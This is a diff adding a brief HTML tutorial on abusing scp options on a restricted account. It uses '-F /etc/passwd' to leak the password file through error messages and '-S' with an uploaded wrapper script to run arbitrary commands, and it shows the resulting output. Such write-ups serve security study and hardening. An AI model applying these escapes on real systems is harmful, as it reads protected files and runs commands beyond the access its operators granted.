@@ -1,0 +1,39 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SCP</title>
+</head><body>-F ssh_config &#09;Specifies an alternative per-user configuration file for ssh. This option is directly passed to ssh(1). &nbsp;<br/>
+This options can be used to “cat” certain types of file:<br/>
+<br/>
+untrusted@demobox ~ $ scp -F /etc/passwd x y:<br/>
+/etc/passwd: line 1: Bad configuration option: root:x:0:0:root:/root:/bin/bash<br/>
+/etc/passwd: line 2: Bad configuration option: bin:x:1:1:bin:/bin:/bin/false<br/>
+/etc/passwd: line 3: Bad configuration option: daemon:x:2:2:daemon:/sbin:/bin/fals<br/>
+<br/>
+<br/>
+<br/>
+-S program &nbsp; &nbsp; &nbsp;Name of program to use for the encrypted connection. &nbsp;The program must understand ssh(1) options.<br/>
+Ah, a way to run other commands! However various command line options are passed to your command that you probably don’t want:<br/>
+<br/>
+untrusted@demobox ~ $ scp -S /usr/bin/id x y:<br/>
+/usr/bin/id: invalid option -- x<br/>
+Try `/usr/bin/id --help' for more information.<br/>
+lost connection<br/>
+<br/>
+untrusted@demobox ~ $ scp -S /bin/echo x y:<br/>
+-x -oForwardAgent no -oPermitLocalCommand no -oClearAllForwardings yes y scp -t .<br/>
+<br/>
+<br/>
+<br/>
+On a box that you control make a simple wrapper script, then upload it:<br/>
+<br/>
+$ cat /tmp/id.sh<br/>
+#!/bin/sh<br/>
+/usr/bin/id<br/>
+$ chmod +x /tmp/id.sh<br/>
+$ scp /tmp/id.sh untrusted@demobox:<br/>
+Once the file is uploaded, run it with scp:<br/>
+<br/>
+untrusted@demobox ~ $ scp -S /home/untrusted/id.sh x y:<br/>
+uid=1008(untrusted) gid=1014(untrusted) groups=1014(untrusted)</body></html>
